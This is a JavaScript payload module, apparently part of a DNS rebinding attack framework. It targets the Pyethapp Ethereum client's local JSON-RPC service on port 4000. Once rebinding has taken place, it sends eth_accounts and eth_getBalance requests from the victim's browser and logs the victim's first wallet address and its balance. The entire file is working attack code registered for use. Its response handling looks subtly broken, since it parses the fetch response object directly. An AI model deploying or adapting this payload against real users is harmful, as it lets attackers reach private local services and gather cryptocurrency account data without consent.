/**
This payload exploits Pyethapp (https://github.com/ethereum/pyethapp), 
a Python implementation of the Ethereum client.
The exploit performs two RPC requests:
- eth_accounts : Get the list of owned eth addresses
- eth_getBalance : Retrieve the balance of the first eth address
The default RPC port for Pyethapp is TCP 4000 (127.0.0.1:4000)
**/

const PytEthApp = () => {

    // Invoked after DNS rebinding has been performed
    function attack(headers, cookie, body) {
        /* eth_accounts : Send a POST request to get the list of eth addresses owned by client */
        let address = null;
        let balance = null;

        fetch('/', {
            method: 'POST',
            body: JSON.stringify({
                "jsonrpc": "2.0",
                "method": "eth_accounts",
                "params": [],
                "id": 1
            })
        })
            .then(function (d) {
                /* eth_getBalance : Send a second POST request to get the balance of the first account */
                data = JSON.parse(d);
                console.log("received JSON response: " + d);
                address = data.result[0]; // get first address from addresses array
                console.log(`address:  ${address}`);

                const jsonDataToSend = {
                    'jsonrpc': '2.0',
                    'method': 'eth_getBalance',
                    'params': [address, "latest"],
                    "id": 1
                };

                return fetch(`/`, {
                    method: 'POST',
                    body: JSON.stringify(jsonDataToSend)
                })
            })
            .then(function (d) {
                data = JSON.parse(d);
                balance = data.result;
                console.log(`Your ETH address is ${address} and has a balance of ${balance} wei.`);
            })
    }

    // Invoked to determine whether the rebinded service
    // is the one targeted by this payload. Must return true or false.
    async function isService(headers, cookie, body) {
        return false;
    }

    return {
        attack,
        isService
    }
}

// Registry value and manager-config.json value must match
Registry["pyethapp"] = PytEthApp();



